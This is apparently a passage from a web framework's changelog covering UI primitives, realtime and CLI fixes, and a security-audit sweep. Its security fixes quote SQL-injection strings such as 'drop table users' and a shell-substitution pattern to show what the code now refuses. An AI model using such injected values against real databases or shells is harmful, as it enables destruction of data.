  `wiki/CLI-Reference.md`, `wiki/Getting-Started.md`, `docs/architecture/12-generated-app.md` and
  `docs/architecture/15-adding-a-feature.md` now say so; step 14 of the feature loop is `bin/check`,
  not `x verify`.
- **The 6.7s `bin/setup` figure is dated to the script it was measured over.**
  `docs/idea/13-dx.md` and `docs/idea/21-the-range.md` presented a four-step measurement as the
  current script's wall time; the env touch and `x manifest` joined it afterwards and are in
  neither number. `wiki/Getting-Started.md`'s transcript is marked the same way, and its closing
  line is `next: bin/dev`.

### Commits

- feat(cli,scripts,ci): the scaffold's own bin/setup and bin/check run green, and the app it emits carries CI (#431)

## 20.0.0 - 2026-09-08

### Added

- **`AsyncRegion` + `asyncBranch`** (`@ultimat3/ui`): one way to render a region that waits on data.
  `AsyncState` is `pending | refreshing | ready | failed` and `AsyncRegionProps.empty` is a
  REQUIRED prop, so forgetting the empty state is `TS2741` rather than a review comment. `empty` is
  structurally unreachable from `pending` — the pending branch carries no data, so nothing can be
  found empty in it. Rendering "No results" for one frame before the first page arrives is the most
  common agent-authored defect in a list screen, and it is now unconstructible. `refreshing` keeps
  the previous data rendered and dimmed under `aria-busy`, which is what stops a search feeling
  slow. `DataTable` was the ONLY place in the framework where `(loading, error, empty, data)` was
  one decision; it now calls the same rule, so there is one implementation and not two.
- **A toast store** (`@ultimat3/ui`): `createToastStore`, `useToasts` and `Toaster`, all three new.
  `Toast` and `ToastRegion` already shipped — correctly, and the live-region reasoning in that file
  is the hard part — but with **zero consumers repo-wide** and no queue behind them, so an app had
  the two components and no way to drive them. Dwell is a token (4s / 8s /
  sticky), the visible stack is capped at 3, identical messages dedupe, and the timer pauses on
  hover, on focus-within **and** on `document.hidden` — a backgrounded tab burned the whole dwell
  and the reader never saw the message.
- **`announce()` is wired** (`@ultimat3/ui`): `AppShell` renders both live regions, empty, into the
  SERVER response. A live region must exist in the DOM before its content is appended or most
  screen readers announce nothing, so the first message of a session was silent — calls 2..n were
  always fine, which is why nobody found it. `announce()` had zero callers.
- **Form submit state, dirty/touched tracking, and focus-first-invalid** (`@ultimat3/ui`):
  `FormBinding` gains `pending()`, `firstInvalidField()`, `touch()`, `edit()` and an `initial`
  baseline. `form-binding.ts` published `status: 'submitting'` and NOTHING consumed it. A failed
  submit now focuses the first invalid CONTROL in declaration order, not just the error summary,
  which left the reader stranded at the top of the form.
- **`defineTheme()` refuses a palette that fails WCAG 2.2 AA** — `X_UI_CONTRAST_INSUFFICIENT`.
  Only pairings the brand can have CHANGED are measured; blaming an app for the framework's own
  colours is how a rule gets switched off. AA and never APCA: APCA is not a standard, and AA is the
  operative legal benchmark. The gate caught a pre-existing unreadable test fixture on its first run.
- **`aspect-ratio` on `Image`** (`@ultimat3/ui`): the `width`/`height` attributes reserve the box
  only until a stylesheet sets a size of its own; `aspect-ratio` survives that.
- **`x shot --all-islands`**: photographs every island in the app in every state it declares, in
  both themes, and writes `.x/shot/island/index.md` — one file an agent opens to see what it is
  looking at, carrying each state's `note` (why it cannot be reached by clicking) and its verdict.
  `islandShotPlan` had expanded the whole set since it was written, was exported, was tested, and
  had **zero callers**. One island failing no longer aborts the run: everything is captured and
  written, then the exit code carries the verdict.
- **The island crop carries a margin** (`ISLAND_CROP_MARGIN_PX`), clamped so it can only ever grow
  the frame. A pixel-tight crop shaved the box-shadow and hairline borders off every picture.
- **Console warnings and an overflow scan** are recorded per island state and surfaced in `--json`.
  Neither gates: gating on a warning is how a useful signal gets switched off.
- **Five new app guards in `x new`** — `semantic-interactive`, `focus-visible`, `image-dimensions`,
  `animated-layout-property`, `island-without-states`. Each is statically decidable and catches a
  defect agents produce at high frequency; each carries a legitimate-lookalike test that must NOT
  be reported, because noise is how a rule gets switched off.
- **`x g island` and `x g resource` emit a `.island.states.ts`**, so a generated island is
  photographable the moment it exists.
- **[`wiki/Interface-Rules.md`](https://github.com/developerz-ai/ultimate/wiki/Interface-Rules)** —
  the interface rules an agent follows, each marked with what refuses it or with the word
  **judgement**. A rule with nothing enforcing it is named as unenforced rather than implied.

### Changed

- **BREAKING — `DataTable` keeps stale rows while reloading** instead of replacing them with
  skeletons. A first load (`rows: []`) still renders skeletons; a reload dims the existing rows
  under `aria-busy`. Replacing rendered content with placeholders on every refresh is a second
  layout change for no news, and it is what makes a fast app feel slow. An app that relied on the
  skeleton appearing on every load sees rows instead.
- **BREAKING — `Button.loading` no longer sets the native `disabled` attribute.** It sets
  `aria-disabled` + `aria-busy` and refuses the click in `onClick` with `preventDefault()`. A
  `disabled` control loses focus mid-flow, is exempt from the contrast minimum, explains nothing,
  and does not actually prevent the double submit — that race is server-side. An app styling
  `button[disabled]` must also style `button[aria-disabled='true']`.

### Fixed

- **`persist: true` is documented everywhere and exists nowhere.** `query()` has never accepted the
  key; the only `persist` in `@ultimat3/realtime` is a private `#persist()` inside the offline
  queue. `wiki/Realtime.md`'s tier ladder, `docs/idea/03-realtime.md`,
  `docs/architecture/07-realtime-internals.md` and `docs/architecture/15-adding-a-feature.md` all
  handed out the flag as an instruction — the last of those on the page an agent is told to follow.
  Tier 3 is reached by passing a `LocalStore` to the live client. `sync-protocol.ts`'s header
  claimed the flag was "enforced here", which is the declared-and-never-wired shape this repo keeps
  re-shipping. Neither `config-readers.ts` nor `declaration-readers.ts` can see a key that exists
  only in prose.
- **Optimistic UI had never executed.** `client-mutations.ts` gates the optimistic apply on
  `if (store && local && !collapsed)`, `LocalStore` is optional, and no app in the repo passed one —
  so `wiki/Realtime.md`'s claim that at tier 2 "my own click feels instant" was false as every
  shipped example configured it. `examples/dummy`'s like button now passes a `MemoryLocalStore` and
  a `RebaseLog`, and both the apply and the rollback are proved by mutation.
- **`wiki/Theming.md` attributed two rules to a linter that cannot see them.** Biome lints
  TypeScript — `bunx biome check` on a `.scss` answers "these paths were provided but ignored". The
  raw-hex rule is `tokens.test.ts` on the `unit` step, and its exemption is two files, not a
  directory.
- **`wiki/Testing.md` said "Twenty steps" over a nineteen-row table** — `policy` was missing.
  `gate-steps.ts` checks the stated count and the list sentence, never the table rows.
- **`wiki/Realtime.md` said IndexedDB, twice.** `createOpfsLocalStore` is SQLite over OPFS; the code
  has never used IndexedDB.

### Commits

- feat(ui,cli,testing): UX primitives, five interface guards, and a whole-app island gallery (#428)

## 19.4.0 - 2026-09-08

### Added

- `ServerOptions.websocket` on `createServer` (`@ultimat3/http`): one path, taken off the pipeline
  and answered by a websocket host on the app's OWN port. `x dev` hands it the sync node, so the
  socket is reachable at `<app origin>/_x/sync` as well as on the node's own `PORT + 1` listener —
  one node, two doors, and `docker/` still publishes the second as a service of its own. Measured
  in ai-maxxing on 2026-09-07 over a VSCodium Remote-SSH workspace: the editor forwards the app's
  port and nothing else, so the page loaded on the forwarded `localhost:3000` while every dial of
  `ws://localhost:3001/_x/sync` failed on the reconnect ladder for hours — the identical upgrade
  answering `101` from the box itself. Nothing was broken at either end; there was no tunnel
  between them. `PORT + 1` is a rule an origin cannot express, and every one-port surface — a
  forwarded port, a Codespace, an ingress, `ssh -L`, a phone on the LAN reading `localhost` as
  itself — publishes the app's port and not its neighbour's. A mount is `{ path, fetch, websocket }`
  and speaks Bun's own convention, which is `SyncNode.fetch`'s: `undefined` means the upgrade took,
  a `Response` is a refusal. Omitted, the `web` role opens no websocket, exactly as before.
  A mount whose path is already answered — a static route, or `/healthz` and `/readyz` — is
  refused at `createServer` with `X_ROUTE_CONFLICT`, the code two routes claiming one path already
  get: Bun matches its native route table before `fetch`, so that route would take the upgrade and
  answer it with a document, leaving a websocket that never opens and nothing saying why. A PARAM
  route is not a conflict — it falls through to `fetch`, where the mount is asked first.
- `SyncNode.path` (`@ultimat3/realtime`): the one path the node answers an upgrade on, published
  because a host that mounts it has to route exactly that path and a second copy of `/_x/sync` in
  the host is the copy that stays behind when `SyncNodeOptions.path` moves. **A minor, not a
  patch**: `SyncNode` is exported, so a hand-built one — a test fake handed to `listenSyncNode` —
  must add `path` to keep typechecking. Nothing that gets its node from `createSyncNode` changes.
- `x dev` logs `sync reachable` with both addresses — the node's own listener and the same node on
  the app's origin. `sync node ready` said only that a node existed, so the first question a failing
  browser socket raises, "is the ws server up, and where?", had no answer in the boot output at all.
  It is also what an editor's port forwarding reads: a url in the terminal is how VS Code and a
  Codespace learn a port exists.

### Commits

- the socket answers on the port the app already publishes (#426)

## 19.3.3 - 2026-09-07

### Added

- `"typecheckBin"` in `x.verify.json`, read by the gate's `typecheck` step in place of a
  hardcoded `tsc`: `bunx <typecheckBin> -b --pretty false`, unchanged otherwise. Measured in
  ai-maxxing on 2026-09-07, chasing a faster `x verify`: the step hardcoded `['bunx', 'tsc', '-b',
  '--pretty', 'false']`, so a repo that wanted a drop-in `-b`-compatible checker — Microsoft's
  `tsgo` (`@typescript/native-preview`) chief among them — had no move but a hand-rolled script
  outside the gate, which is exactly the second checklist the gate exists to prevent. Same seam
  `agentsMdMaxBytes` already uses: a key on the file that configures the gate, read by the step it
  names, absent means the framework default. ai-maxxing's own measurement, same tree, same
  `tsconfig.json` (`strict`, `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes`,
  `verbatimModuleSyntax`, no project references): `tsgo` reported the identical diagnostics tsc
  did on both the clean tree and a probe file exercising every strict flag, and finished in
  1.0s against tsc's 6.4s on the realistic case (one file touched since the last incremental
  build) and 2.8s against 24.8s cold.

### Commits

- feat(cli): the gate's typecheck step takes its checker from x.verify.json (#425)

## 19.3.2 - 2026-09-07

Round 3 from ai-maxxing, 2026-09-06: three defects a live app measured against 19.2.0 and 19.3.1
source, each fixed at the seam with a test. Nothing here changes a documented API.

Round 4, 2026-09-07: two more from the same app, both in `@ultimat3/realtime` and both measured in
a real browser (headless Chrome over CDP) against the dev sync node. Nothing here changes a
documented API.

Round 5, 2026-09-07: two gate seams the same app walked into — a budget the library takes and the
gate never passed, and a rule the gate refuses that the scaffold never wrote down.

Round 6, 2026-09-07: seven seams the same app measured across three production sweeps — a page
that could not answer a status, three MCP refusals with no instruction, a dev server serving a
new island under an old page, one production binding, a SIGTERM no job ever heard, and a test
fixture that restored the globals and left the island ticking. Two documented APIs widen
additively (`ServeOptions.hostname`, an island's `mount` may return its disposer); nothing else
changes.

### Added

- `withStatus(status, data)` in `@ultimat3/render` — the one way a route's `load` answers a
  response status while still rendering its own page. Measured in ai-maxxing on 2026-09-07:
  `/fleet/nope`, a host the fleet does not have, rendered the app's own "Not found" page inside
  its shell and answered **200**, because the only route to a 404 was throwing, which renders the
  framework's error page outside the shell. The status rides on the data by identity — the same
  object comes back, so `load`'s type, `routeDataFor` and every consumer that never asks are
  untouched — and every mode answers it: `ssr`, `stream`, `static`-served, and `isr`, whose entry
  now stores the status beside the HTML (`IsrRenderFn` may return `{ html, status }`; a bare
  string is still 200). A 4xx/5xx is `robots: noindex` by construction, applied by the
  descriptor's `meta` after the route's own ran. A 3xx is `X_ROUTE_STATUS_INVALID` (new) — a
  redirect is a `Location` and no body. `@ultimat3/http` never rewrites a handler's own status,
  now pinned, and `x dev`'s renderer reads the status once per request and hands it to every
  mode. The static build's measurer renders a 404-answering loader without failing.
- `X_MCP_BODY_TOO_LARGE`, and `McpBodyTooLargeError` behind it, for one MCP message larger than
  the transport holds. The HTTP 413 was a bare JSON-RPC `-32600` reading `request body is at
  least N bytes, limit is M` — two numbers and no next step, while the 401, 403 and 429 beside it
  every one carried `{ code, cause, fix }`; a box agent sending a large `promptSession` had
  nothing to act on. The envelope stays (`id: null`, `-32600`, 413 — a client parses it and a
  consumer has pinned it) and now carries `data: { code, cause, fix, limit }`, with the fix naming
  both moves: send less, or raise `mcpHttpRoute({ bodyLimitBytes })`. The stdio line cap answers
  the same code, because it is the same condition.
- `defineAppMcp({ bodyLimitBytes })`. `mcpHttpRoute` took it and the one path an app builds the
  route through never forwarded it, so the fix line above named a knob the app could not reach.
- `HOST`, and `ServeOptions.hostname`. `runRole` had one binding, `0.0.0.0`, so an app that admits
  one implicit actor without a login — which must refuse a public interface — could not run in a
  container. `HOST` is read the way `PORT` is (empty is `0.0.0.0`); `hostname` overrides it the
  way `port` overrides `PORT`; `web`, `sync` and the metrics endpoint bind the same interface. A
  loopback bind inside a container is unreachable through `-p`; reachable with `--network host`
  or a sidecar/`ssh -L` in the same namespace. New optional field on a documented API.
- An island's `mount` may return `() => void`, its disposer — Solid's `render` answers exactly
  that, so the whole of an island's side is `return render(…)`; `x g island` writes it so. The
  hydrate runtime already kept `mount`'s resolution as `el.__x`; `@ultimat3/testing`'s
  `mountIsland` now calls it on dispose (below).

- A repository can set its own `AGENTS.md` budget, as `"agentsMdMaxBytes"` in `x.verify.json`.
  `@ultimat3/manifest`'s `checkAgentsMd`/`assertAgentsMd` have taken a `maxBytes` since they were
  written and the CLI never passed one, so the 12kB default was the only budget any app could
  have — and an app whose conventions genuinely need more room had no move left but to delete a
  rule to make space, which is the opposite of what a context-file budget is for. Measured on
  ai-maxxing: an `AGENTS.md` at 11,996B, four bytes under the ceiling, where adding one
  non-negotiable meant removing another. It lives in `x.verify.json` rather than `x.config.ts`
  because that is the file that configures the GATE, and it is read by the very step that
  enforces the budget — so raising it is a small, visible number a reviewer sees in a diff. A
  value that is not a positive whole number is reported as a floor problem rather than falling
  back to the default: a floor saying `"16kb"` and quietly ignored is a repository that believes
  it raised a budget it did not, and finds out when the gate goes red on a commit that changed
  nothing.
- The generated `AGENTS.md` names the line ceiling. `checkFileSizes` has refused a file over
  `LINE_CEILING` with `X_FILE_TOO_LONG` for as long as the step has existed, and the rules table
  `x new` writes listed nine rules and not that one — so the first an author heard of a 500-line
  ceiling was the gate going red on a file already finished. The row names the code that refuses
  it, like every other row, and the prose names the single exemption (a pure re-export manifest)
  so a legitimately long index is not filed as a bug. A test pins the number in the prose to
  `LINE_CEILING` itself, because a ceiling documented as a different number is worse than one that
  is not documented at all.

### Fixed

- A JSON-RPC batch is refused by name. An array is not an envelope, so it fell through to the
  same bare `-32600` as `{ not: 'jsonrpc' }`, and a client sending a batch learned nothing about
  why. `server.handle` now refuses it before the envelope check — transport-independent — with
  `data: { code: 'X_MCP_PROTOCOL', fix }` naming one request per `POST` (one per line over
  stdio); the plain non-envelope refusal carries the same shape.
- `tool not found: <name>` names the next step: `— call tools/list to read the catalog this
  caller may use`. The same sentence on the absent and the role-hidden branch, still with no
  `data`, so the hint instructs without saying which — the enumeration property
  `security.test.ts` pins is unchanged. It is the one constant `McpToolUnknownError.fix` already
  gave, so the wire and the thrown error cannot drift. Verified beside it, with a test: a
  per-argument `.describe()` on a `t.object` input reaches `tools/list` as that property's
  `description`. It always did; the assertion is now measured rather than assumed.
- **`x dev` serves an edited `page.tsx` on the next request.** A save re-bundled the island and
  kept the FIRST page component — `loadApp` registered a module once per process and `import()`
  answered from Bun's cache — so a page rendered a new island under old props, measured in
  ai-maxxing as a `{detail}` placeholder. A route module whose source changed is now re-imported
  as `<path>?x-reload=<hash>` and its entry replaced; `appRoutes` reads the entry back from the
  table per request. Actions, queries and entities keep the restart rule, now stated.
  `@ultimat3/render`'s loader admits the query-suffixed `.tsx` — anchored on `.tsx$` it handed the
  re-import to Bun's own JSX loader. The dev fixture is its own repository (`.git/HEAD`), because
  the root `.gitignore` had hidden it from the watcher and the reload path was booted by every
  run and exercised by none.
- `@ultimat3/jobs`: SIGTERM reaches the job. The worker's `accept` hook now aborts every held
  run's `ctx.signal` with `X_DRAINING` (naming the worker and the signal) before core's in-flight
  wait starts spending the budget; a body that unwinds is settled as **`interrupted`** — back in
  the ready bucket with the attempt uncounted, never dead-lettered — and a manual `stop()` still
  aborts nothing. Until now the drain told nobody, so a body reading the documented cancellation
  seam ran to the deadline and was abandoned there. Additively: `JobOutcome` gains
  `'interrupted'`, `WorkerStats` gains `interrupted`, `JobDrainedError` is exported;
  `Worker`/`WorkerOptions`/`WorkerStats` live in `worker-types.ts`, re-exported.
- `@ultimat3/testing`: `mountIsland`'s dispose stops the island. When `mount` returns a function
  it is the island's disposer, called before the globals are restored. Restoring globals was the
  whole teardown, so an island polling on an interval kept ticking after the DOM was gone:
  `document is not defined` in unrelated tests, and one file's fetch stub receiving another
  file's POSTs. The `X_TEST_ISLAND_NO_MOUNT` fix line says so.
- The client closes a drained socket with a code a browser accepts. The `reconnect` frame's
  handler called `WebSocket.close(1001, reason)`, and a browser refuses 1001 from script before it
  does anything else: `Uncaught InvalidAccessError: The close code must be either 1000, or between
  3000 and 4999. 1001 is neither.` — an uncaught exception in every tab on every node drain. The
  reconnect still happened, because the node closes the socket itself a moment later; the exception
  was the only trace, and it was in every tab. It closes with `RECONNECT_CODE` (4002) now — the
  private-use range, and the same number the node's own `CLOSE.drain` uses, so a log reads one code
  for one event whichever side closed first; `HEARTBEAT_TIMEOUT_CODE` (4000) is its sibling. The
  test harness's fake socket now refuses every code a browser refuses, so no client suite can pass
  on one; the tests that simulated a lost connection through `close(1006)` — the code a browser
  only ever REPORTS — say `disconnect()` instead.
- The sync node reads the build id the `hello` frame carries. `hello.buildId` is the documented
  place a client names its build (`HelloFrame`, `sync-protocol.ts`), and the node never read it:
  `clientBuildId` came from the dial's `?build=` alone and defaulted to the node's OWN id when the
  query was absent, so a client naming its build only in the frame was deemed current forever and
  never received `update-available`. Measured on ai-maxxing: a page sending `buildId: "dev"` in
  every hello to a node on `46db23f57d6ef969`, and nothing came. `SyncSocket.sawHello(buildId)`
  records the frame's id before `skewed` is asked, so either channel works — `?build=` still does,
  every hello is read, and the latest is the record. `CLOSE` moved to `close-codes.ts`, a leaf
  below both halves, so the client's `RECONNECT_CODE` IS `CLOSE.drain` rather than a second `4002`;
  `socket.ts` re-exports it and every existing import stands. The `LiveClient` never held a URL (`connect` is
  the app's closure), so nothing on the client side changes: an app that appended `?build=` by hand
  may keep it or drop it.

- The surface stylesheet no longer carries Sass's byte-order mark mid-file. Dart Sass writes a
  leading U+FEFF at the head of any compressed output holding a non-ASCII character — a
  `content: '·'` separator is enough, and an escaped `\00b7` is re-emitted as the literal
  character, so escaping in the app was no way out. `stylesFor` joined the compiled modules
  verbatim, so every module after the first that held one began with a BOM glued to its first
  selector — `\uFEFF.dashboard_256ee8e0{display:grid}` — which the browser reads as an unparseable
  selector and drops with the whole rule. Measured on ai-maxxing's home stylesheet: seven modules,
  seven first rules gone, the dashboard's grid container painting `display: block` with only the UA
  rule in Chrome's matched styles. `compileStylesheet` now passes `charset: false` — the bundle is
  served `text/css; charset=utf-8` by its route, so no sheet needs to claim its encoding — and
  `stripCharset` drops a leading BOM or `@charset` at BOTH seams: on every compile, and again where
  the sheets are joined, so a future Sass that ignores the option cannot put one mid-file either.
- The row observer reads a batch's `before` rows as one statement, never one per row. An
  `upsertAll` of five pull requests logged `X_N_PLUS_ONE_QUERY: pull_requests.findById ran 5 times
  in one request — one read per row` — the framework's own change feed tripping the framework's
  own detector, exactly as the job step-write did before #415. The reads were not even coalesced
  into one statement: each `findById` was awaited before the next was issued, and the coalescer's
  window is a microtask. `beforeAllOf` now reads the set with one `findMany` whose `where` is
  `id in (…)`, through the same plan a `findById` takes (same tenant scope, same soft-delete
  filter), chunked at `MAX_PAGE_SIZE`, and a read that refuses still leaves the write alone. The
  one read a point `update`/`delete` makes is now inside `expectedQueryLoop` with its reason on the
  statement: a request that updates fifty rows one at a time is the caller's loop, reported on the
  caller's fifty writes and not a second time on a `findById` no app code issued.
- `x g action` and `x g mutator` throw `<Feature>NotFoundError` only where the slice's `errors.ts`
  declares it. The template imported and threw it unconditionally; ai-maxxing's `fleet` slice
  declares `HostNotFoundError` and `SessionNotFoundError` and no `FleetNotFoundError`, so the
  generated action failed at import — and because `x db gen` and `x manifest` load every module,
  one generated-and-not-yet-edited file made both refuse to run. `run` now reads the slice's
  `errors.ts` off the app's disk and hands it to the pure generator as `sliceErrors`
  (`catalogModule`'s pattern); `sliceExports` reads it with comments masked, and a slice that
  lacks the class gets an action with no `../errors` and no `../repo` import and no lookup by id —
  its handler carries the comment naming the class to declare. A slice with no `errors.ts` yet is
  unchanged: the foundation writes one that declares the class. Both shapes are in the scaffold
  typecheck battery now, and the generated file is loaded for real by the new test.

### Commits

- fix: seven seams ai-maxxing measured — a route answers a status, MCP refusals instruct, x dev reloads a page, a role binds loopback, a job hears SIGTERM, an island unmounts (#424)
- fix(cli): a repo sets its own AGENTS.md budget, and the scaffold names the ceiling it enforces (#423)
- fix(realtime): a reconnect closes with a code a browser accepts, and the node reads hello.buildId (#422)
- fix: three seams ai-maxxing measured — a BOM mid-stylesheet, the observer's own N+1, an import `x g action` assumed (#421)

## 19.3.1 - 2026-09-06

### Fixed

- `release.ts --bump` writes everything the gate reads at the tag, and `--check` refuses on any of
  it. Three files carry the version and are DERIVED from the 48 package manifests a bump stamps,
  and the bump wrote none of them: `framework.manifest.json`, which embeds every package version
  (32 lines — 31 versions plus the `buildId` that hashes them); `bun.lock`, whose 235 recorded
  workspace facts `bun install` will not refresh and `--frozen-lockfile` accepts; and
  `wiki/_Footer.md:8`, the one page in the wiki that stamps a version. Measured on release run
  34064990178: `bun run scripts/release.ts --check 19.3.0` answered
  `{"ok":true,…,"31 packages are stamped at 19.3.0"}` on the v19.3.0 tag's own tree, and the gate
  refused that same tree 157 seconds later — `unit` on `scripts/lockfile-pins.test.ts:205` and
  `manifest` on `X_MANIFEST_DRIFT` + 204 × `X_LOCKFILE_STALE` + `X_VERSION_STAMP_STALE`. Nothing
  published. `--bump` now performs all three after the manifests, through the same passes
  `bun run manifest`, `bun run lockfile:fix` and the gate's own stamp reader run — never a second
  copy — and refuses with the command that performs the one it could not; `--dry-run` names all
  three; `--check` reports each with a runnable `fix:`, so the workflow's own step refuses before
  `verify` spends the two and a half minutes finding out.

### Commits

- fix(release): the bump writes everything the gate reads at the tag
- chore: lockfile pins at 19.3.0

## 19.3.0 - 2026-09-06

Sweep 4, the last, 2026-09-06, is one concern the user reported from a live app: `x dev` was
watching the git directory, `node_modules` and every path the app's own `.gitignore` names.
Measured before the fix on the reference app and re-measured after, on a live `x dev`.

Sweep 3 of the same hunt, 2026-09-06, on the surfaces nobody had read: the gate's own rules (which
of them a spelling evades), the ~200 CLI files two sweeps had not reached, and the `ai`/`mcp`/
`manifest`/`mail`/`notify` internals. 47 findings fixed, one blocked (the `policy` step cannot see
an admin page's permissions — `@ultimat3/admin` has no registry to read; next sweep), one dropped.
Eleven new codes, all gate-side and named below; one new ratchet. Deferred, by name: the
`fix-shell-arg` rows for `auth` (a `curl` on a URL from a provider's discovery document) and `db`
(a catalog column name and a migration path reaching `git checkout --` and `rm`), both pinned with
the sentence saying so; `db/migrate.ts`'s `x db gen "fix <name>"`, whose value lives inside double
quotes and needs a screen that does not exist yet; and `manifest`'s diff fixture, which promises
every field and carries neither `mutator` nor `rateLimit`.

Sweep 2 of the same hunt, 2026-09-06, on three axes the tier hunters could not reach: a
concurrency audit (what happens when this is interrupted, raced or restarted), a security audit
(the `fix:` line as a shell command, tenancy, redirects, images) and a parity pass over the files
sweep 1 listed as unread. 23 findings fixed, one dropped because the code already did it. Two new
codes, both named below; no shipped code changed. Deferred, by name: a gate that refuses a value
interpolated into a command position of a `fix:` (findings in three packages shipped past a green
gate because every value was typed `string`, which `error-render` does not read), and the cache
single-flight's stale-fill ordering under a load that outruns its 30 s deadline.

Sweep 1 of a three-agent bug hunt over every package, 2026-09-06: three read-only hunters over
tiers 0–1, 2–3 and 4–5, each finding reproduced before it was fixed, each fix landing with the
test that failed first. No shipped `X_*` code changed, and one export leaves a barrel — named
below rather than covered by a blanket "nothing is breaking", which is the sentence this file has
outlived before. Deferred, by name:
`@ultimat3/jobs`'s memory driver (`enqueue` throws synchronously under `onConflict: 'error'`;
`introspect.cancel` keeps `claimedBy`/`visibleAt` where `SQL_CANCEL` nulls both) and
`@ultimat3/seo`'s title/description limits counting UTF-16 units — both to the next sweep.

Two seams measured from the same app on 2026-09-06 — on 19.1.3, and confirmed in 19.2.0 source.
Neither is breaking.

### Removed

- **`x jobs drain --to memory` is refused by name.** `wiki/CLI-Reference.md` listed `memory` as a
  supported target; it acked every durable job off the source queue into a `Map` inside a process
  about to exit and reported `ok: true` — the one drain target that "worked" was the one that
  destroyed the work, against the same page's promise that a crash mid-drain duplicates a job
  instead of losing it. A minor carries the removal: a documented path whose only effect was data
  loss is a defect, not a contract. The durable targets are `redis` and `nats`; both are still
  `X_NOT_IMPLEMENTED`, and their `fix:` no longer sends anyone to the drain.

- **`OFFLINE_FALLBACK` is gone from the `@ultimat3/cli` barrel** — it was documented nowhere, so this is not a break of a documented API and a minor carries it. It was the literal
  `apps/web/app/offline.tsx`: a filename `registerRoute` refuses with `X_ROUTE_FILE_INVALID` (the
  directory is the URL, so a page is `page.tsx`), naming a path no route table has ever accepted —
  so an importer held a value that could not be true of any app. `x doctor` now resolves the
  fallback against `describeRoutes()` (`doctor-offline.ts`), which needs no path constant, and
  there is nothing to alias it to: `@ultimat3/pwa`'s `pwa.offline.fallback` is a URL (`/offline`),
  not a file. An app that imported it wanted the scaffolded page, which is
  `apps/web/site/offline/page.tsx` — write that path, or read the URL off `app.config.ts`.

### Fixed

- **`db`: an index's `order` is re-derived from `asc`/`desc`/absent and its partial `where` is screened through `statementsOf`**, so `order: 'desc; drop table users; --'` and `where: '1=1); drop table users; --'` are `X_SQL_UNSAFE` at `x db gen` instead of a second command inside a `create index` that `ROLE=migrate` runs. Both fields cross the seam structurally from `@ultimat3/entity` and nothing in `db` screened them, while `indexMethodSql` two lines down re-derives its literal from a closed set for exactly this reason.
- **`db`: a generated column's expression is screened by the same lexer before it is spliced into `generated always as (…) stored`**, the rule `declaredChecks` already applied to a CHECK's predicate.
- **`db`: `X_MIGRATION_CONFLICT`'s `fix:` screens the ledger row's id and app version through `shellInertIdentifier`** and degrades to prose naming no command when either is hostile, so a ledger row can no longer put `$(…)` into a line the error tells an operator to paste; the surviving command renders the id through `literal()`.
- **`storage`: `validateUpload` refuses bytes no magic rule recognises when the declared type is one a signature could confirm** (`image/*`, `application/pdf`, `video/mp4`, every zip container); one trailing control byte used to make an HTML document acceptable as `image/png`, against the file's own header. Types no signature can confirm (`text/csv`, `application/json`) are still accepted.
- **`flags`: `assertTargeting` refuses a `subjects` that is not a map with `X_FLAG_TARGETING_INVALID`**; `subjects: null` from a store snapshot used to escape as a bare `TypeError` out of `Object.entries`.
- **`core`: `safeUrl` refuses `data:image/svg+xml` in `src` as well as in `href`**: an SVG is a script document, and every `src` a route renders passes through this function.
- **`core`: a non-finite metric value is refused before its series is created**, on `gauge.add`, `gauge.record` and `histogram.record`; a rejected `NaN` used to consume one of the instrument's bounded series slots permanently.
- **`http`: CSRF requires an EXACT origin listing, never the CORS response value.** `checkCsrf` asked `allowedOrigin(...) !== null`, which answers `'*'` for `origins: ['*'], credentials: false` — the one wildcard `assertCorsConfig` admits — so a credentialed cross-site `POST` from any origin was answered `{"ok":true}` by the stage that exists to refuse exactly it. `originListed` is the new companion in `cors.ts`, off the same array.
- **`realtime`: a cold subscribe the database refused no longer leaks its query entry.** The entry is created before the snapshot read that fills it, and `unsubscribe` could only reach one through a subscription that was never attached, so `maxEntries` failed subscribes answered `X_SUBSCRIPTION_LIMIT` to every later subscriber for the life of the process — after the database had recovered.
- **`realtime`: a channel patch id carries the publishing node.** It was a per-process counter, so two `sync` replicas on one topic minted the same id for one subscriber, with no cursor and no re-snapshot to repair it. `ChannelHubOptions.nodeId` declares the mark; it defaults to a per-hub id.
- **`auth`: `verifySession({ ip: null })` clears a stale stored address.** `observed?.ip ?? session.ip` read an explicit null as silence, so an address recorded once was written forward on every verify and the device list showed it as current.
- **`query`: a repeated `?__proto__=` in a search string cannot swap the input object's prototype.** `pageControlsOf` built its input as `{}`; it is `Object.create(null)` now, the rule `@ultimat3/http`'s query collector already followed.
- **`x doctor`'s offline fallback is resolved against the route table, not a filename.** It probed the literal `apps/web/app/offline.tsx` — a name `registerRoute` refuses — while `x new` scaffolds `apps/web/site/offline/page.tsx` and its own `fix:` writes `apps/web/app/offline/page.tsx`, so every app the framework has ever produced reported `X_PWA_NO_OFFLINE_FALLBACK` from its first run and no invocation could clear it. It now matches the declared `pwa.offline.fallback` against `describeRoutes()`, on either navigable surface, and its `fix:` is `x g route offline --surface site` — the same line `@ultimat3/pwa` gives for the same code. `OFFLINE_FALLBACK` leaves the `@ultimat3/cli` barrel with it — it named a path no route table accepts.
- **A precache revision is the document's content hash again, the offline page included.** `pwaRoutes` projected four of `PwaRoute`'s eight fields, so every route entry read `revision: <buildId>, bytes: 0`: a deploy of a byte-identical site re-fetched every precached page and the 5 MB precache budget could not count one byte of HTML. `x build --target static` now emits `sw.js` after the render pass and feeds each route its own `contentHash(html)` and byte count — and the offline document through `offlineFallbackRevision`/`offlineFallbackBytes`, the only channel that can reach it, since `buildPrecacheManifest` adds that entry ahead of every route. A fallback no route renders still keeps the build id.
- **`X_ENV_MISSING` names the file write.** Its fix was `x new --force`, which answers `X_CLI_BAD_FLAG` inside an app and scaffolds a second app with a name; it is now `cp .env.example .env.development`.
- **`testing`: a matcher no longer raises on the value it was handed.** `toRejectInput`, `toAcceptInput` and `toDenyPolicy` built their messages eagerly with `JSON.stringify`, so a schema that correctly rejected a BigInt or a cyclic input reported "Matcher returned a promise that rejected" instead. Messages are thunks now, rendered with core's `renderCauseValue`.
- **`x g` with no generator is a missing subcommand.** It answered `X_CLI_UNKNOWN_COMMAND: "x g" is not a command`, which is false; the refusal now lists every generator and its fix is `x help g`.
- **A script a document names twice is charged once against `budget.js`.** Only island entries were deduped, so a src repeated by a page and its layout could fail a budget the page clears.
